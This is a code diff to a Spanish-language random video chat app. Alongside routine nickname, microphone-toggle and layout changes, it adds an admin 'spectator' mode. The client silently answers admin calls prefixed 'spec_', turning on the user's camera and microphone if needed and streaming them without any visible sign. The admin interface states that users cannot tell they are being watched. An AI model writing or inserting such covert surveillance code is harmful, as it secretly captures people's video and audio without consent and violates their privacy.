@@ -972,6 +972,88 @@ function AdminView() {
   const onlinePollRef = useRef<ReturnType<typeof setInterval> | null>(null)
   const heartbeatRef = useRef<ReturnType<typeof setInterval> | null>(null)
 
+  // Spectator mode state
+  const [onlineUsers, setOnlineUsers] = useState<any[]>([])
+  const [spectatingUser, setSpectatingUser] = useState<any>(null)
+  const spectatorCallRef = useRef<any>(null)
+  const spectatorVideoRef = useRef<HTMLVideoElement>(null)
+  const [specBanDialog, setSpecBanDialog] = useState<{ username: string } | null>(null)
+  const [specBanReason, setSpecBanReason] = useState('')
+  const [loadingSpectator, setLoadingSpectator] = useState(false)
+
+  const loadOnlineUsers = async () => {
+    try {
+      const res = await fetch('/api/online-count?list=true')
+      const data = await res.json()
+      if (data.users) {
+        setOnlineUsers(data.users.filter((u: any) => !u.isAdmin))
+      }
+    } catch {}
+  }
+
+  const handleSpectate = async (targetUser: any) => {
+    if (!globalPeer) {
+      toast.error('PeerJS no esta listo')
+      return
+    }
+    setLoadingSpectator(true)
+    setSpectatingUser(targetUser)
+    try {
+      const call = globalPeer.call(targetUser.peerId, new MediaStream())
+      spectatorCallRef.current = call
+      call.on('stream', (remoteStream: MediaStream) => {
+        console.log('[ADMIN-SPEC] Got stream from', targetUser.username)
+        if (spectatorVideoRef.current) spectatorVideoRef.current.srcObject = remoteStream
+        setLoadingSpectator(false)
+      })
+      call.on('close', () => {
+        console.log('[ADMIN-SPEC] Call closed')
+        if (spectatorVideoRef.current) spectatorVideoRef.current.srcObject = null
+        setLoadingSpectator(false)
+      })
+      call.on('error', (err: any) => {
+        console.error('[ADMIN-SPEC] Call error:', err)
+        toast.error('Error al conectar con el usuario')
+        setLoadingSpectator(false)
+      })
+      setTimeout(() => {
+        if (spectatorCallRef.current === call) {
+          toast.error('No se recibio video. El usuario puede no estar disponible.')
+          setLoadingSpectator(false)
+        }
+      }, 15000)
+    } catch (e) {
+      console.error('[ADMIN-SPEC] Exception:', e)
+      toast.error('Error al conectar')
+      setLoadingSpectator(false)
+    }
+  }
+
+  const handleCloseSpectator = () => {
+    try { spectatorCallRef.current?.close() } catch {}
+    spectatorCallRef.current = null
+    if (spectatorVideoRef.current) spectatorVideoRef.current.srcObject = null
+    setSpectatingUser(null)
+    setLoadingSpectator(false)
+  }
+
+  const handleSpecBan = async () => {
+    if (!specBanDialog) return
+    try {
+      const userRes = await fetch('/api/pending-users')
+      const userData = await userRes.json()
+      const foundUser = [...(userData.users || [])].find((u: any) => u.username === specBanDialog.username)
+      if (!foundUser) { toast.error('Usuario no encontrado en la base de datos'); return }
+      const res = await fetch('/api/ban-user', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userId: foundUser.id, reason: specBanReason || 'Baneado por espectador' })
+      })
+      const data = await res.json()
+      if (data.error) toast.error(data.error)
+      else { toast.success(specBanDialog.username + ' baneado'); setSpecBanDialog(null); setSpecBanReason(''); handleCloseSpectator() }
+    } catch { toast.error('Error al banear') }
+  }
+
   const handleRefresh = async () => {
     setRefreshing(true)
     await loadAdminData()
@@ -1019,6 +1101,7 @@ function AdminView() {
             <TabsTrigger value="verified" className="data-[state=active]:bg-green-600">Verificados ({verifiedUsers.length})</TabsTrigger>
             <TabsTrigger value="video-queue" className="data-[state=active]:bg-purple-600">Video Queue ({videoQueue.length})</TabsTrigger>
             <TabsTrigger value="reported" className="data-[state=active]:bg-purple-600">Reportados ({reportedUsers.length})</TabsTrigger>
+            <TabsTrigger value="spectator" className="data-[state=active]:bg-purple-600" onClick={loadOnlineUsers}>Espectador</TabsTrigger>
           </TabsList>
 
           <TabsContent value="pending">
@@ -1087,10 +1170,61 @@ function AdminView() {
               </div></ScrollArea></CardContent>
             </Card>
           </TabsContent>
+
+          <TabsContent value="spectator">
+            <Card className="bg-gray-900 border-gray-800">
+              <CardHeader><CardTitle className="text-lg">Espectador - Usuarios Online ({onlineUsers.length})</CardTitle><CardDescription className="text-gray-400">Observa usuarios en tiempo real sin que lo sepan</CardDescription></CardHeader>
+              <CardContent>
+                <div className="mb-3"><Button size="sm" variant="outline" onClick={loadOnlineUsers}>Actualizar lista</Button></div>
+                {!peerReady ? (
+                  <div className="text-center py-8 space-y-3"><div className="text-4xl">📡</div><p className="text-gray-400 text-sm">Conectando al P2P...</p></div>
+                ) : onlineUsers.length === 0 ? (
+                  <p className="text-gray-500 text-center py-8">No hay usuarios online</p>
+                ) : (
+                  <ScrollArea className="max-h-96"><div className="space-y-2">
+                    {onlineUsers.map((u: any) => (
+                      <div key={u.peerId} className="flex items-center justify-between p-3 bg-gray-800 rounded-lg">
+                        <div className="flex items-center gap-3">
+                          <span>{getGenderShort(u.gender)}</span>
+                          <div>
+                            <p className="font-medium text-sm">{u.nickname || u.username}</p>
+                            <p className="text-xs text-gray-500">{u.country || 'Desconocido'} {u.countryCode ? '(' + u.countryCode + ')' : ''}</p>
+                          </div>
+                        </div>
+                        <Button size="sm" className="bg-purple-600 hover:bg-purple-700" onClick={() => handleSpectate(u)}>Ver</Button>
+                      </div>
+                    ))}
+                  </div></ScrollArea>
+                )}
+              </CardContent>
+            </Card>
+          </TabsContent>
         </Tabs>
       </main>
       <Dialog open={!!banDialog} onOpenChange={() => setBanDialog(null)}><DialogContent className="bg-gray-900 border-gray-700 text-white"><DialogHeader><DialogTitle>Banear a {banDialog?.username}</DialogTitle></DialogHeader><Input placeholder="Razon" value={banReason} onChange={(e) => setBanReason(e.target.value)} className="bg-gray-800 border-gray-600" /><div className="flex gap-3"><Button variant="outline" className="flex-1" onClick={() => setBanDialog(null)}>Cancelar</Button><Button className="flex-1 bg-red-600 hover:bg-red-700" onClick={handleBan}>Banear</Button></div></DialogContent></Dialog>
       <Dialog open={!!suspendDialog} onOpenChange={() => setSuspendDialog(null)}><DialogContent className="bg-gray-900 border-gray-700 text-white"><DialogHeader><DialogTitle>Suspender a {suspendDialog?.username}</DialogTitle></DialogHeader><Input type="number" placeholder="Horas" value={suspendHours} onChange={(e) => setSuspendHours(e.target.value)} className="bg-gray-800 border-gray-600" min="1" /><div className="flex gap-2 flex-wrap">{[1, 6, 24, 72, 168].map((h) => (<Button key={h} size="sm" variant="outline" className={Number(suspendHours) === h ? 'bg-orange-600 border-orange-500' : ''} onClick={() => setSuspendHours(String(h))}>{h}h</Button>))}</div><div className="flex gap-3"><Button variant="outline" className="flex-1" onClick={() => setSuspendDialog(null)}>Cancelar</Button><Button className="flex-1 bg-orange-600 hover:bg-orange-700" onClick={handleSuspend}>Suspender</Button></div></DialogContent></Dialog>
+      {/* Spectator video dialog */}
+      <Dialog open={!!spectatingUser} onOpenChange={(open) => { if (!open) handleCloseSpectator() }}>
+        <DialogContent className="bg-gray-950 border-gray-700 text-white max-w-3xl w-full">
+          <DialogHeader>
+            <DialogTitle>Espectando: {spectatingUser?.nickname || spectatingUser?.username}</DialogTitle>
+            <DialogDescription className="text-gray-400">El usuario no puede ver que lo estas observando</DialogDescription>
+          </DialogHeader>
+          <div className="relative bg-black rounded-lg overflow-hidden" style={{ minHeight: '300px', maxHeight: '70vh' }}>
+            {loadingSpectator && (
+              <div className="absolute inset-0 flex items-center justify-center z-10">
+                <div className="text-center"><div className="w-10 h-10 border-3 border-purple-500 border-t-transparent rounded-full animate-spin mx-auto mb-2" /><p className="text-gray-400 text-sm">Conectando...</p></div>
+              </div>
+            )}
+            <video ref={spectatorVideoRef} autoPlay playsInline muted className="w-full object-contain" style={{ maxHeight: '70vh' }} />
+          </div>
+          <div className="flex gap-2 mt-3">
+            <Button variant="outline" className="flex-1" onClick={handleCloseSpectator}>Cerrar</Button>
+            <Button className="flex-1 bg-red-600 hover:bg-red-700" onClick={() => setSpecBanDialog({ username: spectatingUser?.username || '' })}>Banear</Button>
+          </div>
+        </DialogContent>
+      </Dialog>
+      <Dialog open={!!specBanDialog} onOpenChange={() => setSpecBanDialog(null)}><DialogContent className="bg-gray-900 border-gray-700 text-white"><DialogHeader><DialogTitle>Banear a {specBanDialog?.username}</DialogTitle></DialogHeader><Input placeholder="Razon" value={specBanReason} onChange={(e) => setSpecBanReason(e.target.value)} className="bg-gray-800 border-gray-600" /><div className="flex gap-3"><Button variant="outline" className="flex-1" onClick={() => setSpecBanDialog(null)}>Cancelar</Button><Button className="flex-1 bg-red-600 hover:bg-red-700" onClick={handleSpecBan}>Banear</Button></div></DialogContent></Dialog>
     </div>
   )
 }
@@ -1410,11 +1544,13 @@ function MainView() {
   const onlineCount = useDhobbytvStore((s) => s.onlineCount)
   const messages = useDhobbytvStore((s) => s.messages)
   const announcement = useDhobbytvStore((s) => s.announcement)
+  const nickname = useDhobbytvStore((s) => s.nickname)
   const setSelectedCountry = useDhobbytvStore((s) => s.setSelectedCountry)
   const toggleHobby = useDhobbytvStore((s) => s.toggleHobby)
   const setPartner = useDhobbytvStore((s) => s.setPartner)
   const setSearching = useDhobbytvStore((s) => s.setSearching)
   const setOnlineCount = useDhobbytvStore((s) => s.setOnlineCount)
+  const setNickname = useDhobbytvStore((s) => s.setNickname)
   const addMessage = useDhobbytvStore((s) => s.addMessage)
   const clearMessages = useDhobbytvStore((s) => s.clearMessages)
 
@@ -1437,6 +1573,9 @@ function MainView() {
   const [showChat, setShowChat] = useState(false)
   const [remoteMuted, setRemoteMuted] = useState(true)
   const cleaningUpRef = useRef(false)
+  const [micMuted, setMicMuted] = useState(false)
+  const [editingNickname, setEditingNickname] = useState(false)
+  const [nicknameInput, setNicknameInput] = useState('')
 
   useEffect(() => { messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' }) }, [messages])
 
@@ -1472,7 +1611,7 @@ function MainView() {
       // 1. Register online IMMEDIATELY via Supabase
       console.log('[MAIN] Registering online:', peerId)
       try {
-        const joinRes = await fetch('/api/online-count', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'join', peerId, username: user!.username, gender: user!.gender, isAdmin: false }) })
+        const joinRes = await fetch('/api/online-count', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'join', peerId, username: user!.username, gender: user!.gender, isAdmin: false, country, countryCode, nickname: useDhobbytvStore.getState().nickname || '' }) })
         const joinData = await joinRes.json()
         if (joinData.error) console.error('[MAIN] Online join error:', joinData.error)
         else console.log('[MAIN] Online join OK:', joinData)
@@ -1513,6 +1652,24 @@ function MainView() {
         if (!mounted) return
         console.log('[MAIN] Incoming call from:', call.peer)
 
+        // Spectator call from admin (spec_ prefix) - answer silently without changing UI
+        if (call.peer.startsWith('spec_')) {
+          if (globalStream) {
+            call.answer(globalStream)
+          } else {
+            try {
+              const stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 1920 }, height: { ideal: 1080 }, facingMode: 'user' }, audio: true })
+              setGlobalStream(stream)
+              if (localVideoRef.current) localVideoRef.current.srcObject = stream
+              call.answer(stream)
+            } catch { return }
+          }
+          call.on('stream', () => {})
+          call.on('close', () => {})
+          call.on('error', () => {})
+          return
+        }
+
         // Stop polling - we got matched!
         matchedRef.current = true
         if (searchPollRef.current) { clearInterval(searchPollRef.current); searchPollRef.current = null }
@@ -1525,7 +1682,7 @@ function MainView() {
         // Get camera if we don't have a stream yet
         if (!globalStream) {
           try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 1920 }, height: { ideal: 1080 }, facingMode: 'user' }, audio: true })
             setGlobalStream(stream)
             if (localVideoRef.current) localVideoRef.current.srcObject = stream
           } catch (e) {
@@ -1578,9 +1735,9 @@ function MainView() {
             const msg = typeof raw === 'string' ? JSON.parse(raw) : raw
             if (msg.type === 'chat') addMessage(partner?.username || 'Otro', msg.text)
             else if (msg.type === 'partner-info') {
-              setPartner({ peerSocketId: msg.peerId, username: msg.username, gender: msg.gender, country: msg.country, countryCode: msg.countryCode })
+              setPartner({ peerSocketId: msg.peerId, username: msg.username, gender: msg.gender, country: msg.country, countryCode: msg.countryCode, nickname: msg.nickname || '' })
               clearMessages()
-              addMessage('Sistema', 'Conectado con ' + msg.username + ' ' + getCountryFlag(msg.countryCode) + ' ' + msg.country)
+              addMessage('Sistema', 'Conectado con ' + (msg.nickname || msg.username) + ' ' + getCountryFlag(msg.countryCode) + ' ' + msg.country)
             }
           } catch { addMessage(partner?.username || 'Otro', String(raw)) }
         })
@@ -1622,7 +1779,7 @@ function MainView() {
     // Only get camera if we don't already have a stream
     if (!globalStream) {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 1920 }, height: { ideal: 1080 }, facingMode: 'user' }, audio: true })
         setGlobalStream(stream)
         if (localVideoRef.current) localVideoRef.current.srcObject = stream
       } catch {
@@ -1638,8 +1795,9 @@ function MainView() {
     }
 
     console.log('[MAIN] Joining matchmaking:', globalPeerId, 'filter:', selectedCountry)
+    const myNickname = useDhobbytvStore.getState().nickname || user.username
     try {
-      const joinRes = await fetch('/api/matchmaking', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'join', peerId: globalPeerId, username: user.username, gender: user.gender, country, countryCode, hobbies, countryFilter: selectedCountry }) })
+      const joinRes = await fetch('/api/matchmaking', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'join', peerId: globalPeerId, username: user.username, gender: user.gender, country, countryCode, hobbies, countryFilter: selectedCountry, nickname: myNickname }) })
       const joinData = await joinRes.json()
       if (joinData.error) {
         console.error('[MAIN] Matchmaking join error:', joinData.error)
@@ -1675,9 +1833,9 @@ function MainView() {
         fetch('/api/matchmaking', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'leave', peerId: globalPeerId }) }).catch(() => {})
         fetch('/api/matchmaking', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'leave', peerId: match.peerId }) }).catch(() => {})
         setSearching(false)
-        setPartner({ peerSocketId: match.peerId, username: match.username, gender: match.gender, country: match.country, countryCode: match.countryCode })
+        setPartner({ peerSocketId: match.peerId, username: match.username, gender: match.gender, country: match.country, countryCode: match.countryCode, nickname: match.nickname || '' })
         clearMessages()
-        addMessage('Sistema', 'Conectado con ' + match.username + ' ' + getCountryFlag(match.countryCode) + ' ' + match.country)
+        addMessage('Sistema', 'Conectado con ' + (match.nickname || match.username) + ' ' + getCountryFlag(match.countryCode) + ' ' + match.country)
         console.log('[MAIN] Match found! Calling:', match.peerId)
 
         // Call the match with our stream
@@ -1706,15 +1864,15 @@ function MainView() {
         // Data connection for chat
         const conn = globalPeer!.connect(match.peerId, { reliable: true })
         dataConnRef.current = conn
-        conn.on('open', () => { conn.send(JSON.stringify({ type: 'partner-info', peerId: globalPeerId, username: user.username, gender: user.gender, country, countryCode })) })
+        conn.on('open', () => { conn.send(JSON.stringify({ type: 'partner-info', peerId: globalPeerId, username: user.username, gender: user.gender, country, countryCode, nickname: myNickname })) })
         conn.on('data', (raw: any) => {
           try {
             const msg = typeof raw === 'string' ? JSON.parse(raw) : raw
             if (msg.type === 'chat') addMessage(match.username, msg.text)
             else if (msg.type === 'partner-info') {
-              setPartner({ peerSocketId: msg.peerId, username: msg.username, gender: msg.gender, country: msg.country, countryCode: msg.countryCode })
+              setPartner({ peerSocketId: msg.peerId, username: msg.username, gender: msg.gender, country: msg.country, countryCode: msg.countryCode, nickname: msg.nickname || '' })
               clearMessages()
-              addMessage('Sistema', 'Conectado con ' + msg.username + ' ' + getCountryFlag(msg.countryCode) + ' ' + match.country)
+              addMessage('Sistema', 'Conectado con ' + (msg.nickname || msg.username) + ' ' + getCountryFlag(msg.countryCode) + ' ' + match.country)
             }
           } catch { addMessage(match.username, String(raw)) }
         })
@@ -1791,6 +1949,20 @@ function MainView() {
     } catch { toast.error('Error al reportar') }
   }
 
+  const toggleMic = () => {
+    if (!globalStream) return
+    const newMuted = !micMuted
+    setMicMuted(newMuted)
+    globalStream.getAudioTracks().forEach(t => { t.enabled = !newMuted })
+  }
+
+  const handleSaveNickname = () => {
+    if (nicknameInput.trim()) {
+      setNickname(nicknameInput.trim())
+    }
+    setEditingNickname(false)
+  }
+
   const handleLogout = () => {
     handleStop()
     if (globalPeerId) fetch('/api/online-count', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'leave', peerId: globalPeerId }) }).catch(() => {})
@@ -1804,11 +1976,28 @@ function MainView() {
   const filteredCountries = COUNTRIES.filter((c) => c.code === 'all' || c.name.toLowerCase().includes(countrySearch.toLowerCase()))
 
   // ==================== OmeTV-STYLE UI ====================
+  const displayName = nickname || user?.username || ''
+  const displayNickname = editingNickname ? (
+    <div className="flex items-center gap-1">
+      <input autoFocus value={nicknameInput} onChange={(e) => setNicknameInput(e.target.value)} onKeyDown={(e) => { if (e.key === 'Enter') handleSaveNickname(); if (e.key === 'Escape') setEditingNickname(false) }} className="bg-black/50 border border-gray-500 rounded px-1.5 py-0.5 text-xs text-white w-20 outline-none focus:border-purple-500" />
+      <button onClick={handleSaveNickname} className="text-green-400 hover:text-green-300 cursor-pointer"><svg className="w-3 h-3" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg></button>
+    </div>
+  ) : (
+    <span className="text-gray-400 text-xs hidden sm:inline">{getCountryFlag(countryCode)} {displayName}</span>
+  )
+
+  const micButton = (
+    <button onClick={toggleMic} className="rounded-full p-2 bg-white/10 hover:bg-white/20 transition-all cursor-pointer" title={micMuted ? 'Activar microfono' : 'Silenciar microfono'}>
+      {micMuted ? (
+        <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2" /></svg>
+      ) : (
+        <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m-4 0h8m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z" /></svg>
+      )}
+    </button>
+  )
+
   return (
     <div className="h-screen w-screen bg-black text-white flex flex-col overflow-hidden">
-      {/* Announcement banner */}
-      {announcement && <div className="bg-yellow-600 text-white text-center py-1.5 text-xs shrink-0 z-50">{announcement}</div>}
-
       {/* STATE 1: Pre-search - Camera preview with controls (OmeTV home style) */}
       {!partner && !isSearching && (
         <div className="flex-1 flex flex-col relative">
@@ -1816,17 +2005,16 @@ function MainView() {
           <div className="absolute top-0 left-0 right-0 z-30 flex items-center justify-between px-3 py-2 bg-gradient-to-b from-black/80 to-transparent">
             <h1 className="text-lg font-black"><span className="text-purple-400">dhobby</span><span className="text-green-400">tv</span></h1>
             <div className="flex items-center gap-2">
-              <div className="flex items-center gap-1.5 bg-black/50 rounded-full px-3 py-1">
-                <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
-                <span className="text-green-400 text-xs font-medium">{onlineCount} Users online</span>
-              </div>
-              <span className="text-gray-400 text-xs hidden sm:inline">{getCountryFlag(countryCode)} {user?.username}</span>
+              {displayNickname}
+              <button onClick={() => { setNicknameInput(nickname); setEditingNickname(true) }} className="text-gray-400 hover:text-white cursor-pointer"><svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z" /></svg></button>
               <button onClick={handleLogout} className="text-gray-400 hover:text-white text-xs ml-1">Salir</button>
             </div>
           </div>
 
-          {/* Camera preview (full screen background) */}
-          <video ref={localVideoRef} autoPlay playsInline muted style={{ transform: 'scaleX(-1)' }} className="absolute inset-0 w-full h-full object-cover" />
+          {/* Camera preview (full screen background) - zoom out effect */}
+          <div className="absolute inset-0 overflow-hidden">
+            <video ref={localVideoRef} autoPlay playsInline muted style={{ transform: 'scaleX(-1)' }} className="w-[130%] h-[130%] object-cover" />
+          </div>
           <div className="absolute inset-0 bg-gradient-to-t from-black/90 via-black/30 to-black/60" />
 
           {/* Rules warning */}
@@ -1853,10 +2041,6 @@ function MainView() {
                 <span className="font-medium">{getCountryFlag(selectedCountry)} {getCountryName(selectedCountry)}</span>
                 <svg className={cn('w-3 h-3', showCountrySelect && 'rotate-180')} fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M19 9l-7 7-7-7" /></svg>
               </button>
-              <button onClick={() => setShowHobbies(!showHobbies)} className={cn('flex items-center gap-2 rounded-full px-4 py-2.5 text-sm transition-colors', showHobbies ? 'bg-purple-600' : 'bg-white/10 hover:bg-white/20 backdrop-blur-sm')}>
-                <span>Intereses</span>
-                {hobbies.length > 0 && <span className="bg-white/20 rounded-full px-2 text-xs">{hobbies.length}</span>}
-              </button>
             </div>
 
             {/* Country dropdown */}
@@ -1864,13 +2048,6 @@ function MainView() {
               <div className="bg-gray-900/95 backdrop-blur border border-gray-700 rounded-xl shadow-2xl max-h-60 overflow-hidden mx-auto max-w-sm">
                 <div className="p-2"><Input placeholder="Buscar pais..." value={countrySearch} onChange={(e) => setCountrySearch(e.target.value)} className="bg-gray-800 border-gray-600 text-sm h-8" autoFocus /></div>
                 <ScrollArea className="max-h-44">{filteredCountries.map((c) => (<button key={c.code} onClick={() => { setSelectedCountry(c.code); setShowCountrySelect(false); setCountrySearch('') }} className={cn('w-full text-left px-4 py-2 text-sm hover:bg-gray-700 transition-colors flex items-center gap-2', selectedCountry === c.code ? 'bg-purple-600/30 text-purple-300' : 'text-gray-300')}>{c.flag} {c.name}</button>))}</ScrollArea>
-              </div>
-            )}
-
-            {/* Hobbies panel */}
-            {showHobbies && (
-              <div className="bg-gray-900/95 backdrop-blur border border-gray-700 rounded-xl shadow-2xl p-3 mx-auto max-w-sm">
-                <div className="flex flex-wrap gap-1.5">{HOBBIES.map((h) => (<button key={h.id} onClick={() => toggleHobby(h.id)} className={cn('px-2.5 py-1 rounded-full text-xs border transition-all', hobbies.includes(h.id) ? 'bg-purple-600 border-purple-500 text-white' : 'bg-gray-800 border-gray-700 text-gray-400 hover:border-gray-500')}>{h.icon} {h.label}</button>))}</div>
               </div>
             )}
 
@@ -1890,15 +2067,14 @@ function MainView() {
           <div className="absolute top-0 left-0 right-0 z-30 flex items-center justify-between px-3 py-2 bg-gradient-to-b from-black/80 to-transparent">
             <h1 className="text-lg font-black"><span className="text-purple-400">dhobby</span><span className="text-green-400">tv</span></h1>
             <div className="flex items-center gap-2">
-              <div className="flex items-center gap-1.5 bg-black/50 rounded-full px-3 py-1">
-                <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
-                <span className="text-green-400 text-xs font-medium">{onlineCount} online</span>
-              </div>
+              {micButton}
             </div>
           </div>
 
-          {/* Own camera full screen */}
-          <video ref={localVideoRef} autoPlay playsInline muted style={{ transform: 'scaleX(-1)' }} className="absolute inset-0 w-full h-full object-cover" />
+          {/* Own camera full screen - zoom out effect */}
+          <div className="absolute inset-0 overflow-hidden">
+            <video ref={localVideoRef} autoPlay playsInline muted style={{ transform: 'scaleX(-1)' }} className="w-[130%] h-[130%] object-cover" />
+          </div>
           <div className="absolute inset-0 bg-black/40" />
 
           {/* Searching indicator */}
@@ -1906,6 +2082,16 @@ function MainView() {
             <div className="w-16 h-16 border-4 border-purple-500 border-t-transparent rounded-full animate-spin" />
             <p className="text-white text-lg font-medium">Buscando persona...</p>
             <p className="text-gray-400 text-sm">Filtro: {getCountryFlag(selectedCountry)} {getCountryName(selectedCountry)}</p>
+          </div>
+
+          {/* Country change while searching */}
+          <div className="relative z-30 px-3 pb-2">
+            <div className="flex justify-center">
+              <div className="bg-gray-900/95 backdrop-blur border border-gray-700 rounded-xl shadow-2xl max-h-52 overflow-hidden max-w-sm w-full">
+                <div className="p-2"><Input placeholder="Buscar pais..." value={countrySearch} onChange={(e) => setCountrySearch(e.target.value)} className="bg-gray-800 border-gray-600 text-sm h-8" /></div>
+                <ScrollArea className="max-h-36">{filteredCountries.map((c) => (<button key={c.code} onClick={() => { setSelectedCountry(c.code); setCountrySearch('') }} className={cn('w-full text-left px-4 py-1.5 text-sm hover:bg-gray-700 transition-colors flex items-center gap-2', selectedCountry === c.code ? 'bg-purple-600/30 text-purple-300' : 'text-gray-300')}>{c.flag} {c.name}</button>))}</ScrollArea>
+              </div>
+            </div>
           </div>
 
           {/* Cancel button */}
@@ -1924,15 +2110,14 @@ function MainView() {
           <div className="flex items-center justify-between px-3 py-2 bg-gray-900 border-b border-gray-800 shrink-0 z-30">
             <div className="flex items-center gap-2">
               <h1 className="text-sm font-black"><span className="text-purple-400">dhobby</span><span className="text-green-400">tv</span></h1>
-              <div className="flex items-center gap-1.5 bg-black/50 rounded-full px-2.5 py-1">
-                <div className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse" />
-                <span className="text-green-400 text-[10px] font-medium">{onlineCount} online</span>
-              </div>
             </div>
             <div className="flex items-center gap-1.5 bg-gray-800 rounded-full px-3 py-1">
               <span>{getGenderShort(partner.gender)}</span>
-              <span className="text-white text-xs font-medium">{partner.username}</span>
+              <span className="text-white text-xs font-medium">{partner.nickname || partner.username}</span>
               <span className="text-gray-400 text-xs">{getCountryFlag(partner.countryCode)} {partner.country}</span>
+            </div>
+            <div className="flex items-center gap-1">
+              {micButton}
             </div>
           </div>
 
@@ -1948,15 +2133,15 @@ function MainView() {
                 </button>
               )}
               <div className="absolute bottom-2 left-2 bg-black/60 rounded-full px-2.5 py-1 text-[10px] text-gray-300 font-medium">
-                {partner.username} {getGenderShort(partner.gender)} {getCountryFlag(partner.countryCode)}
+                {partner.nickname || partner.username} {getGenderShort(partner.gender)} {getCountryFlag(partner.countryCode)}
               </div>
             </div>
 
-            {/* Local video (you) - BOTTOM on mobile, RIGHT on desktop */}
-            <div className="relative flex-1 bg-gray-900 min-h-0">
-              <video ref={localVideoRef} autoPlay playsInline muted style={{ transform: 'scaleX(-1)' }} className="w-full h-full object-cover bg-gray-900" />
+            {/* Local video (you) - BOTTOM on mobile, RIGHT on desktop - zoom out effect */}
+            <div className="relative flex-1 bg-gray-900 min-h-0 overflow-hidden">
+              <video ref={localVideoRef} autoPlay playsInline muted style={{ transform: 'scaleX(-1)' }} className="w-[130%] h-[130%] object-cover bg-gray-900" />
               <div className="absolute bottom-2 left-2 bg-black/60 rounded-full px-2.5 py-1 text-[10px] text-green-400 font-medium">
-                Tu {getGenderShort(user?.gender || '')}
+                {displayName} {getGenderShort(user?.gender || '')}
               </div>
             </div>
 
@@ -2002,7 +2187,7 @@ function MainView() {
       )}
 
       {/* Report dialog */}
-      <Dialog open={showReport} onOpenChange={setShowReport}><DialogContent className="bg-gray-900 border-gray-700 text-white"><DialogHeader><DialogTitle>Reportar a {partner?.username}</DialogTitle></DialogHeader><Input placeholder="Razon" value={reportReason} onChange={(e) => setReportReason(e.target.value)} className="bg-gray-800 border-gray-600" /><div className="flex gap-3"><Button variant="outline" className="flex-1" onClick={() => setShowReport(false)}>Cancelar</Button><Button className="flex-1 bg-red-600 hover:bg-red-700" onClick={handleReport}>Reportar</Button></div></DialogContent></Dialog>
+      <Dialog open={showReport} onOpenChange={setShowReport}><DialogContent className="bg-gray-900 border-gray-700 text-white"><DialogHeader><DialogTitle>Reportar a {partner?.nickname || partner?.username}</DialogTitle></DialogHeader><Input placeholder="Razon" value={reportReason} onChange={(e) => setReportReason(e.target.value)} className="bg-gray-800 border-gray-600" /><div className="flex gap-3"><Button variant="outline" className="flex-1" onClick={() => setShowReport(false)}>Cancelar</Button><Button className="flex-1 bg-red-600 hover:bg-red-700" onClick={handleReport}>Reportar</Button></div></DialogContent></Dialog>
     </div>
   )
 }
